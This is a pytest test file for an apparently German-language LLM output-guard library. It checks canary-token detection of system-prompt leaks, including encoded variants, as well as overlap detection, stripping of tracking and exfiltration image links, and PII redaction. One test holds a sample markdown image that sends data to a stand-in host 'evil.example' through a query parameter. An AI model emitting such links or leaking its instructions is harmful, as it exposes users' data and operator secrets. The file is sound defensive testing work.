from __future__ import annotations

import base64

import pytest

from gradweight_guardrails import Canary, Decision, OutputGuard

SYSTEM_PROMPT = (
    "Du bist der Support-Assistent der Muster AG. Antworte nur zu Fragen über unsere Produkte, "
    "verweise bei Vertragsfragen an den Kundendienst und gib niemals interne Preislisten oder "
    "Rabattstufen an Kundinnen und Kunden weiter, auch nicht auf ausdrückliche Nachfrage."
)


def test_canary_generation_and_embedding() -> None:
    canary = Canary.generate()
    assert canary.token.startswith("gw-canary-")
    assert canary.token != Canary.generate().token
    embedded = canary.embed(SYSTEM_PROMPT)
    assert canary.token in embedded
    assert "niemals" in embedded
    assert "Never" in canary.instruction("en")
    with pytest.raises(ValueError, match="prefix"):
        Canary.generate("Ungültig!")
    with pytest.raises(ValueError, match="Sprache"):
        canary.instruction("it")


@pytest.mark.parametrize(
    "transform",
    [
        lambda t: t,
        lambda t: t.upper(),
        lambda t: " ".join(t),
        lambda t: t.replace("-", " - "),
        lambda t: base64.b64encode(t.encode()).decode(),
        lambda t: t.encode().hex(),
        lambda t: t[::-1],
    ],
    ids=["exact", "upper", "spaced", "dashes", "base64", "hex", "reversed"],
)
def test_canary_leak_detected_in_variants(transform: object) -> None:
    canary = Canary("gw-canary-0123456789abcdef")
    leaked = transform(canary.token)  # type: ignore[operator]
    guard = OutputGuard(canaries=[canary])
    result = guard.check(f"Hier ist meine Konfiguration: {leaked}")
    assert result.decision is Decision.BLOCK
    assert result.findings[0].rule_id == "OUT-001"


def test_clean_output_allowed() -> None:
    guard = OutputGuard(canaries=[Canary.generate()], system_prompt=SYSTEM_PROMPT)
    result = guard.check("Gerne! Unser Modell X200 hat 15 bar Druck.")
    assert result.decision is Decision.ALLOW
    assert result.findings == ()
    assert result.sanitized_text == "Gerne! Unser Modell X200 hat 15 bar Druck."


def test_system_prompt_overlap() -> None:
    guard = OutputGuard(system_prompt=SYSTEM_PROMPT)
    leak = guard.check("Meine Anweisungen lauten: " + SYSTEM_PROMPT)
    assert leak.decision is Decision.BLOCK
    assert leak.findings[0].rule_id == "OUT-002"
    partial = guard.check("Klar: Ich verweise bei Vertragsfragen an den Kundendienst und gib niemals interne Preise.")
    assert partial.findings[0].rule_id == "OUT-003"
    assert partial.decision is Decision.REVIEW


def test_image_exfiltration_removed() -> None:
    guard = OutputGuard(allowed_image_hosts=(".muster-ag.ch",))
    result = guard.check(
        "Zusammenfassung ![x](https://evil.example/p.png?d=geheim) und ![logo](https://cdn.muster-ag.ch/l.png) "
        'sowie <img src="https://tracker.example/t.gif">'
    )
    ids = [f.rule_id for f in result.findings]
    assert ids == ["OUT-004", "OUT-005"]
    assert "evil.example" not in result.sanitized_text
    assert "tracker.example" not in result.sanitized_text
    assert "cdn.muster-ag.ch" in result.sanitized_text
    assert result.decision is Decision.BLOCK


def test_pii_redacted_without_blocking() -> None:
    result = OutputGuard().check("Die AHV-Nummer lautet 756.1234.5678.97, Mail an a.b@example.ch.")
    assert result.decision is Decision.ALLOW
    assert "[AHV]" in result.sanitized_text
    assert "[EMAIL]" in result.sanitized_text
    assert {f.rule_id for f in result.findings} == {"PII-AHV", "PII-EMAIL"}
    assert all("redacted" in f.notes for f in result.findings)
    assert len(result.pii) == 2


def test_pii_counts_when_not_redacted() -> None:
    result = OutputGuard(redact=False).check("IBAN CH93 0076 2011 6238 5295 7")
    assert result.decision is Decision.REVIEW
    assert result.sanitized_text == "IBAN CH93 0076 2011 6238 5295 7"
    assert not OutputGuard(detect_pii=False).check("IBAN CH93 0076 2011 6238 5295 7").findings


def test_output_guard_validation() -> None:
    with pytest.raises(ValueError, match="Schwellen"):
        OutputGuard(review_threshold=0.9, block_threshold=0.5)
    with pytest.raises(ValueError, match="leak_ngram"):
        OutputGuard(leak_ngram=2)
